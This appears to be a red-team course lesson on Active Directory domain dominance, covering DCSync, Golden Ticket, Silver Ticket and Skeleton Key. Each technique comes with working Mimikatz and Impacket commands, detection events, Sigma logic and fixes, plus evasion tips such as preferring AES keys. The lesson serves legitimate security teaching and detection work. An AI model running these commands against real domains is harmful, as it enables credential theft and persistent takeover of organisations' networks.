---
title: "Domain Dominance — DCSync, Golden Ticket, Silver Ticket, Skeleton Key"
tags: [red-team, domain-dominance, DCSync, golden-ticket, silver-ticket, skeleton-key,
  Kerberos, Mimikatz, ATT&CK, T1003.006, T1558.001, T1558.002]
module: 08-RedTeam-01
day: 499
related_topics:
  - Lateral Movement Advanced (Day 498)
  - Milestone Day 500 (Day 500)
  - Kerberoasting and Pass-the-Hash Intro (Day 175)
  - Pass-the-Ticket (Day 498)
---

# Day 499 — Domain Dominance

> "There is a difference between having access and having control. Domain Admin
> is access. A forged Golden Ticket is control — persistent, deniable, and
> invisible to most defences. That is what domain dominance looks like.
> Know how it is done so you know how to detect it."
>
> — Ghost

---

## Goals

Understand and execute the four primary domain dominance techniques: DCSync,
Golden Ticket, Silver Ticket, and Skeleton Key.
Map each technique to its ATT&CK ID, required privilege level, and primary
detection signal.
Understand why each technique is dangerous and what the defender must do to
prevent or detect it.

**Prerequisites:** Day 498 (lateral movement), Day 175 (PtH/Kerberos intro),
Active Directory fundamentals, Domain Admin-level access to the lab.
**Time budget:** 5 hours.

---

## Part 1 — Domain Dominance: What It Means

Domain dominance is the red team's end state in an Active Directory engagement.
It is not just having DA credentials — it is controlling the trust and
authentication infrastructure itself.

```
Levels of AD compromise:

Level 1: Local Admin on one machine
  → Credential access on that machine only

Level 2: Domain User with privilege escalation path
  → Service account, Kerberoastable account, ACL abuse

Level 3: Domain Admin (DA)
  → Full control of the domain — but DA password can be changed/rotated

Level 4: Domain Dominance
  → Control of the Kerberos infrastructure itself
  → Golden Ticket: forge TGTs for any user, any time, without the KDC
  → DCSync: extract all domain hashes on demand — persistence survives DA rotation
  → Skeleton Key: backdoor LSASS on the DC — any password works
```

Domain dominance is the goal of an advanced red team engagement. A defender
who can only detect DA privilege use has not solved the problem.

---

## Part 2 — DCSync (T1003.006)

### DCSync Attack — T1003.006 (OS Credential Dumping: DCSync)

**What it is:**
An attack that abuses the Directory Replication Service (DRS) protocol to pull
password hashes for any user from a Domain Controller — including `krbtgt` —
without logging into the DC or touching LSASS.

**Why it works:**
Active Directory uses DRS to synchronise password data between DCs. The
`GetNCChanges` RPC call (used in replication) returns sensitive attributes
including `unicodePwd` (NTLM hash) and Kerberos keys. Any account with
`DS-Replication-Get-Changes`, `DS-Replication-Get-Changes-All`, and
`DS-Replication-Synchronize` rights on the domain root can call this — by
default, DCs, Domain Admins, and Enterprise Admins. Misconfigured ACLs
sometimes grant it to service accounts.

**How to spot it in the wild:**
Any account that is not a DC calling `GetNCChanges` on the domain NC
(`DC=corp,DC=local`). Mimikatz performs DCSync from the attacker's workstation,
not from a DC. The source IP in replication events will be a non-DC host.

**Minimal exploit:**

```bash
# Requires: DA or an account with DS-Replication-Get-Changes-All
# Run from any host (not required to be on the DC)

# Dump all domain hashes:
mimikatz "lsadump::dcsync /domain:corp.local /all /csv" exit

# Dump only the krbtgt hash (for Golden Ticket):
mimikatz "lsadump::dcsync /domain:corp.local /user:krbtgt" exit

# Output includes:
# NTLM hash, AES-128 key, AES-256 key for the requested account

# Via Impacket (from Kali, no interactive session needed):
python3 secretsdump.py -just-dc-user krbtgt \
    CORP/Administrator@DC.corp.local -hashes :ADMIN_NTLM_HASH
```

**Real-world case:**
DCSync is a standard technique in virtually every advanced AD engagement.
It was prominently used in the HAFNIUM Exchange Server intrusions (2021) and
has been documented in numerous APT campaigns. The technique was released
publicly in Mimikatz in 2015 by Benjamin Delpy.

**Detection:**

```
Primary: Windows Event 4662 on domain controllers
  Object Type: domainDNS
  Access Mask: 0x100 (ReadProperty) + replication properties
  Accesses: "Replicating Directory Changes All"

Filtering out noise:
  Exclude source accounts: machine accounts ending in $
  Exclude source IPs: known DC IP addresses
  Alert on: non-DC IP making the replication call

Sigma rule logic:
  EventID: 4662
  ObjectType: domainDNS
  Properties:
    - 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2  (DS-Replication-Get-Changes)
    - 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2  (DS-Replication-Get-Changes-All)
  SubjectUserName NOT ending in $
```

**Fix:**
Audit `DS-Replication-Get-Changes-All` rights quarterly.
Remove the right from any non-DC account.
Enable Advanced Audit for DS Access (Audit Directory Service Access).

---

## Part 3 — Golden Ticket (T1558.001)

### Golden Ticket — T1558.001 (Steal or Forge Kerberos Tickets: Golden Ticket)

**What it is:**
A forged Ticket-Granting Ticket (TGT) created offline using the `krbtgt`
account's NTLM hash (or AES key). The forged TGT is accepted by any KDC in the
domain because it is cryptographically valid — signed with the real `krbtgt`
key.

**Why it works:**
The KDC signs TGTs with the `krbtgt` hash. When it receives a TGT, it verifies
the signature using `krbtgt` — it does not keep a log of which TGTs it issued.
An attacker who has the `krbtgt` hash can forge a TGT for any user, with any
group memberships, with any expiry time — and the KDC will accept it as
legitimate.

```
Normal Kerberos flow:
  Client → KDC AS-REQ → KDC issues TGT (signed with krbtgt hash)
  Client → KDC TGS-REQ with TGT → KDC issues Service Ticket

Golden Ticket flow:
  Red team has krbtgt hash (from DCSync)
  Mimikatz forges a TGT offline: no network traffic to the KDC
  Forged TGT injected into session
  Client → KDC TGS-REQ with forged TGT → KDC validates signature → issues ST
```

**How to spot it in the wild:**
Suspicious ticket properties: user account does not exist in AD, unusually long
ticket lifetime (Mimikatz default is 10 years), missing PAC fields, or TGT
claims membership in groups the user does not actually belong to.

**Minimal exploit:**

```bash
# Step 1: Get krbtgt hash (via DCSync — see Part 2):
mimikatz "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
# Note: NTLM hash, domain SID (S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX)

# Step 2: Forge the Golden Ticket:
mimikatz "kerberos::golden \
    /user:Administrator \
    /domain:corp.local \
    /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
    /krbtgt:KRBTGT_NTLM_HASH \
    /ptt"
# /ptt = pass the ticket into current session immediately

# With AES-256 key (harder to detect — avoid NTLM downgrade signals):
mimikatz "kerberos::golden \
    /user:Administrator \
    /domain:corp.local \
    /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
    /aes256:KRBTGT_AES256_KEY \
    /ptt"

# Verify: the current session now has a forged TGT for Administrator
klist

# Use it:
dir \\DC.corp.local\C$    # authenticates as Administrator
```

**Real-world case:**
The technique was discovered and named by Benjamin Delpy (Mimikatz author).
It was used extensively in the NotPetya campaign (2017) for lateral movement
after the attackers had gained domain control. Once `krbtgt` is compromised,
the domain cannot be trusted until the account is reset **twice** (once to
invalidate existing tickets, once more after the standard rotation interval).

**Detection:**

```
Primary signals:
  Event 4768 (TGT request): Ticket Encryption Type = 0x17 (RC4-HMAC)
    when the domain supports AES — suggests forged ticket with NTLM hash
  Event 4769 (Service Ticket request) from an account with no prior 4768
    (the TGT was forged — no AS-REQ occurred)
  PAC validation failures (rare — only if PAC validation is enabled)

Advanced detection:
  Microsoft Defender for Identity (MDI) specifically detects Golden Tickets:
    "Suspected Golden Ticket usage (nonexistent account)"
    "Suspected Golden Ticket usage (ticket anomaly)"
  Anomalous ticket lifetime (> 10 hours is a signal; 10 years is a red flag)
```

**Fix:**
Rotate `krbtgt` password **twice** (at least 24 hours apart to avoid replication
issues). This invalidates all existing Golden Tickets.
Protect `krbtgt` with Privileged Identity Management (PIM) and alert on any
replication of its attributes.
Deploy Microsoft Defender for Identity for Golden Ticket detection.

---

## Part 4 — Silver Ticket (T1558.002)

### Silver Ticket — T1558.002 (Steal or Forge Kerberos Tickets: Silver Ticket)

**What it is:**
A forged Service Ticket (ST) for a specific service, created using the service
account's NTLM hash — not the `krbtgt` hash. Unlike a Golden Ticket, a Silver
Ticket bypasses the KDC entirely for the target service.

**Why it works:**
Service Tickets are encrypted with the service account's hash (not `krbtgt`).
The KDC is not involved in validating STs — the application server decrypts the
ticket itself. An attacker with a service account's hash can forge an ST for
that service for any user.

```
Comparison:
  Golden Ticket: forged TGT → accepted by the KDC → works for ANY service
  Silver Ticket: forged ST → sent directly to the SERVICE → no KDC contact

Trade-off:
  Silver Ticket is narrower (specific service only)
  Silver Ticket is stealthier (no KDC contact = fewer logs)
  Silver Ticket requires only the SERVICE ACCOUNT hash, not krbtgt
```

**Minimal exploit:**

```bash
# Requires: NTLM hash of the target service account
# Common targets:
#   CIFS (file shares): Computer account hash (hostname$)
#   HTTP (web apps): IIS application pool account hash
#   MSSQL: SQL service account hash

# Get the computer account hash (for CIFS access to a host):
# Via DCSync or from LSASS on the target host:
mimikatz "lsadump::dcsync /domain:corp.local /user:WORKSTATION01$" exit

# Forge a Silver Ticket for CIFS on WORKSTATION01:
mimikatz "kerberos::golden \
    /user:Administrator \
    /domain:corp.local \
    /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
    /target:WORKSTATION01.corp.local \
    /service:cifs \
    /rc4:MACHINE_ACCOUNT_NTLM_HASH \
    /ptt"
# Note: /rc4 here is the machine account hash, not krbtgt

# Access the target file share — no KDC contact:
dir \\WORKSTATION01.corp.local\C$

# Silver Ticket for MSSQL:
mimikatz "kerberos::golden \
    /user:Administrator \
    /domain:corp.local \
    /sid:... \
    /target:SQLSRV.corp.local \
    /service:MSSQLSvc \
    /rc4:SQL_SERVICE_ACCOUNT_HASH \
    /ptt"
```

**Real-world case:**
Silver Tickets are commonly used for persistent access to specific services
(file shares, databases, internal web apps) while avoiding the noise of a
full Golden Ticket. They have been documented in post-exploitation frameworks
as a standard persistence mechanism after Kerberoasting yields a service
account hash.

**Detection:**

```
Primary signal:
  Event 4624 (logon) on the target service with no corresponding Event 4768
  (TGT request) on the KDC — the ticket was forged, bypassing the KDC

  Silver Tickets have no PAC validation by default. If the service has
  "Require PAC" set (rare), the server will contact the KDC for validation
  and the forged ticket will fail.

Network anomaly:
  Kerberos traffic between client and service with no prior AS-REQ/TGS-REQ
  to the KDC

MDI detection:
  "Suspected Silver Ticket usage" — anomaly-based
```

**Fix:**
Rotate service account passwords regularly (Managed Service Accounts / Group
Managed Service Accounts automate this).
Enable PAC validation for sensitive services.
Use gMSAs (Group Managed Service Accounts) — passwords rotated automatically,
harder to Kerberoast and Silver Ticket.

---

## Part 5 — Skeleton Key (T1556.001)

### Skeleton Key — T1556.001 (Modify Authentication Process)

**What it is:**
A patch to the LSASS process on a Domain Controller that installs a master
password accepted for all domain accounts — while the real passwords continue
to work. Every account in the domain can be authenticated with the skeleton key
password OR their real password.

**Why it works:**
LSASS handles Kerberos pre-authentication and NTLM authentication on the DC.
Mimikatz's `misc::skeleton` patches the `kdcsvc.dll` code in memory to add a
secondary accepted password (`mimikatz` by default). The real password is
unchanged; the skeleton key is an additional accepted credential.

```
Before skeleton key:
  DC authenticates user with their real password hash

After skeleton key:
  DC authenticates user with their real password hash OR "mimikatz"
  → Red team can authenticate as ANY domain user with the master password
```

**Minimal exploit:**

```bash
# Requires: SYSTEM on a Domain Controller (via lateral movement from Part 4)
# Run Mimikatz on the DC:

mimikatz "privilege::debug misc::skeleton" exit

# Default skeleton key password: "mimikatz"
# Now test: authenticate as any user with password "mimikatz":
net use \\DC.corp.local\NETLOGON /user:corp\AnyUser mimikatz
# → should succeed for every domain account
```

**Important limitations:**

- The skeleton key patch is **not persistent**. It does not survive a DC reboot.
- Only works on DCs where the patch is applied. Multiple DCs require patching
  each one.
- Does NOT work for accounts that require smart card authentication.
- Does NOT affect accounts that use AES Kerberos pre-authentication if the
  patch targets the RC4 path only (depends on Mimikatz version).

**Real-world case:**
The Skeleton Key attack was first documented by Dell SecureWorks in 2015 after
a Chinese APT was found to have deployed it against an enterprise network. It
provides persistent access without changing any account passwords, making it
difficult to detect through normal credential monitoring.

**Detection:**

```
Primary: Sysmon Event 10 (ProcessAccess to lsass.exe from mimikatz/any unusual
  process on the DC itself — not a normal workstation)

LSASS integrity:
  Enabling RunAsPPL (Protected Process Light) for LSASS prevents user-mode
  processes from injecting into it. Skeleton key requires SYSTEM + ability
  to modify LSASS memory — PPL blocks this.

Authentication anomalies:
  Multiple user accounts authenticating with identical timestamps or patterns
  Event 4625 (failed logon) followed immediately by 4624 (success) from the
  same source IP for different user accounts — possible skeleton key testing

MDI detection:
  "Skeleton Key malware detected" — MDI has a specific signature for the
  known Mimikatz skeleton key patch pattern in LSASS memory reads
```

**Fix:**
Enable LSASS Protection (RunAsPPL):

```
HKLM\SYSTEM\CurrentControlSet\Control\Lsa → RunAsPPL = 1 (DWORD)
```

This requires a reboot and prevents user-mode processes from reading or writing
LSASS memory, which blocks Skeleton Key, Mimikatz LSASS dumps, and most
credential-dumping techniques simultaneously.

---

## Part 6 — Privilege Escalation Paths to Domain Dominance

```
Path 1: Kerberoast → crack service account → DCSync if account has replication rights
  Day 175 → Day 499 Part 2

Path 2: Compromise DA → DCSync → Golden Ticket + offline persistence
  Day 498 (lateral movement) → Day 499 Parts 2–3

Path 3: Obtain machine account hash → Silver Ticket for specific service
  Day 498 (PtH) → Day 499 Part 4

Path 4: Lateral movement to DC → Skeleton Key (temporary persistence)
  Day 498 (WMI/DCOM) → Day 499 Part 5

Path 5: ACL abuse → Targeted DCSync rights for a low-priv account
  AD ACL misconfiguration → Part 2 (any account with replication rights)
```

---

## ATT&CK Mapping

| Technique | ATT&CK ID | Privilege required | Detection primary signal |
|---|---|---|---|
| DCSync | T1003.006 | DA / Replication rights | Event 4662 from non-DC IP |
| Golden Ticket | T1558.001 | krbtgt hash | Event 4769 with no prior 4768 |
| Silver Ticket | T1558.002 | Service account hash | Event 4624 with no KDC request |
| Skeleton Key | T1556.001 | SYSTEM on DC | Sysmon Event 10 on DC |

---

## Key Takeaways

1. DCSync requires only the `DS-Replication-Get-Changes-All` right — not
   necessarily Domain Admin. Misconfigured ACLs on service accounts can open
   this path. Audit it quarterly.
2. A Golden Ticket forged with the `krbtgt` AES-256 key is harder to detect
   than one using NTLM/RC4, because AES is the expected encryption type in
   modern domains. Use AES keys, not NTLM hashes, in engagements.
3. Silver Tickets bypass the KDC entirely. There is no TGS-REQ — the ST goes
   directly to the service. This makes them stealthier than Golden Tickets for
   single-service access.
4. Skeleton Key does not persist across reboots and does not survive LSASS
   protection (PPL). It is a temporary persistence mechanism, not a long-term
   backdoor. Pair it with a persistent C2 beacon.
5. The `krbtgt` password must be rotated **twice** to invalidate Golden Tickets.
   A single rotation is not sufficient because the previous hash is cached for
   the standard ticket lifetime window.

---

## Exercises

1. Perform a DCSync from a lab workstation (as a DA) using both Mimikatz and
   Impacket `secretsdump.py`. Record Event 4662 on the DC. Write a Sigma rule
   that catches the Impacket version (different source than Mimikatz).
2. Forge a Golden Ticket for a non-existent user (`/user:ghost_does_not_exist`)
   using the `krbtgt` AES-256 key. Verify the ticket with `klist`. Use it to
   access `\\DC\C$`. Note which Event IDs fire on the DC.
3. Obtain the computer account hash for a lab workstation. Forge a Silver Ticket
   for `cifs` on that workstation. Access `\\WORKSTATION\C$`. Confirm no TGS-REQ
   appears in DC logs.
4. Apply the skeleton key to the lab DC. Authenticate as any domain user using
   the password `mimikatz`. Then reboot the DC and confirm the skeleton key is
   gone. Write a detection script that queries LSASS process access events on
   the DC.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q499.1, Q499.2 …).

---

## Navigation

← Previous: [Day 498 — Lateral Movement Advanced](DAY-0498-Lateral-Movement-Advanced.md)
→ Next: [Day 500 — Milestone Day 500](DAY-0500-Milestone-500-Days.md)
